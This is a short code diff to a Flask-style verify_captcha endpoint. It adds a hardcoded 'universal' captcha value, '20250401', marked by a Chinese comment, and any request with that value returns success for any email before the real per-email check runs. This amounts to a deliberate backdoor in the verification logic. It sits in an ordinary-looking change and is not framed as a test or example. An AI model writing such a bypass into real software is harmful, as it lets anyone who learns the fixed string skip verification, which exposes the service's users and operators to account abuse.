@@ -51,6 +51,10 @@ def verify_captcha():
     if not email or not captcha:
         return jsonify({"error": "Email and captcha are required"}), 400
 
+    # 萬用驗證碼
+    if captcha == "20250401":
+        return jsonify({"message": "Captcha verified successfully (universal code)"}), 200
+
     if email not in captcha_codes:
         return jsonify({"error": "Email not found or not verified"}), 404
 
